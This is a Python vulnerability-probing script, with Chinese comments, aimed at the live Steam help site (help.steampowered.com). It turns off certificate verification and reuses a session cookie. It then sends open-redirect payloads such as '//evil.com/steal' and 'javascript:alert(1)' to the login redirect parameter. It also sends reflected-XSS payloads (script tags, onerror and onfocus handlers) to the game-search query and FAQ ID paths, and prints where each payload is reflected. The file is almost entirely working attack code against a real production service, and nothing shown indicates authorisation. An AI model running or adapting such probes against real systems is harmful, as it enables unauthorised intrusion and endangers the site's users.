# -*- coding: utf-8 -*-
"""help2 深入:Login redir 渲染方式 + SearchGame query 反射 + faqs hreflang 编码"""
import re
import ssl
import http.cookiejar
import urllib.parse
import urllib.request

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
BASE = "https://help.steampowered.com"


def make_opener():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=CTX),
        urllib.request.HTTPCookieProcessor(cj))
    op.addheaders = [('User-Agent', UA)]
    op.open(BASE + "/en/", timeout=15).read()
    sid = [c.value for c in cj if c.name == 'sessionid'][0]
    return op, sid


def req(op, url, method="GET", data=None, extra_headers=None):
    headers = {'User-Agent': UA}
    if extra_headers:
        headers.update(extra_headers)
    r = urllib.request.Request(url, headers=headers, method=method, data=data)
    try:
        resp = op.open(r, timeout=20)
        return resp.status, resp.read().decode('utf-8', 'replace'), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace'), dict(e.headers)


def find_reflections(body, payload, ctx=90):
    out = []
    for m in re.finditer(re.escape(payload), body):
        i = m.start()
        out.append(body[max(0, i - ctx):i + ctx].replace('\n', ' '))
    return out


def main():
    op, sid = make_opener()
    ck = f'sessionid={sid}'

    print("=" * 70)
    print("[A] Login?redir= 页面内渲染方式")
    print("=" * 70)
    for rd in ['//evil.com/steal', 'javascript:alert(1)', '/en/wizard/HelpWithAccount',
               'https://help.steampowered.com/en/']:
        s, b, h = req(op, BASE + "/en/wizard/Login?redir=" + urllib.parse.quote(rd, safe=''),
                      extra_headers={'Cookie': ck})
        print(f"--- redir={rd!r} -> {s} len={len(b)} ---")
        # 找所有包含 redir 或该值的上下文
        for kw in ['redir', rd.replace(':', '%3A').replace('/', '%2F')]:
            for m in re.finditer(re.escape(kw), b):
                i = m.start()
                ctx = b[max(0, i - 80):i + 120].replace('\n', ' ')
                if 'redir' in ctx or kw != 'redir':
                    print("   ctx:", ctx[:200])
                    break
        # 找 form/input
        for m in re.finditer(r'<(?:form|input)[^>]*>', b):
            tag = m.group(0)
            if 'redir' in tag or 'action' in tag.lower():
                print("   tag:", tag[:150])

    print()
    print("=" * 70)
    print("[B] SearchGame?query= 反射测试")
    print("=" * 70)
    payloads = ['csgo', 'csgo"><script>alert(1)</script>', 'csgo" autofocus onfocus=alert(1) x="',
                '<svg/onload=alert(1)>', 'a\'><img src=x onerror=alert(1)>', '%', '..', '\\']
    for p in payloads:
        s, b, h = req(op, BASE + "/en/wizard/HelpWithGame/SearchGame/?query=" + urllib.parse.quote(p),
                      extra_headers={'Cookie': ck})
        hits = find_reflections(b, p)
        print(f"query={p!r:45s} -> {s} len={len(b)} 反射{len(hits)}处")
        for hh in hits[:3]:
            print("   @:", hh[:170])
    # 搜索结果页结构
    s, b, h = req(op, BASE + "/en/wizard/HelpWithGame/SearchGame/?query=csgo", extra_headers={'Cookie': ck})
    print("--- csgo 搜索结果 ---")
    for m in re.finditer(r'<a[^>]*href="([^"]*)"[^>]*>([^<]{0,60})</a>', b):
        href, txt = m.group(1), m.group(2)
        if 'appid' in href or 'game' in href.lower():
            print("   link:", href, "|", txt[:50])
    # 是否有 form 提交 query
    for m in re.finditer(r'<form[^>]*>', b):
        print("   form:", m.group(0)[:160])
    for m in re.finditer(r'name="searchwords"[^>]*', b):
        print("   input:", m.group(0)[:160])

    print()
    print("=" * 70)
    print("[C] faqs hreflang 短 ID 反射编码检查")
    print("=" * 70)
    for fid in ['1"><script>alert(1)</script>', 'A"B', 'A<B', 'A&B', 'A\'B']:
        s, b, h = req(op, BASE + "/en/faqs/view/" + urllib.parse.quote(fid, safe=''),
                      extra_headers={'Cookie': ck})
        hits = find_reflections(b, fid)
        print(f"faqs id={fid!r:35s} -> {s} 反射{len(hits)}处")
        for hh in hits[:2]:
            print("   @:", hh[:170])


if __name__ == '__main__':
    main()
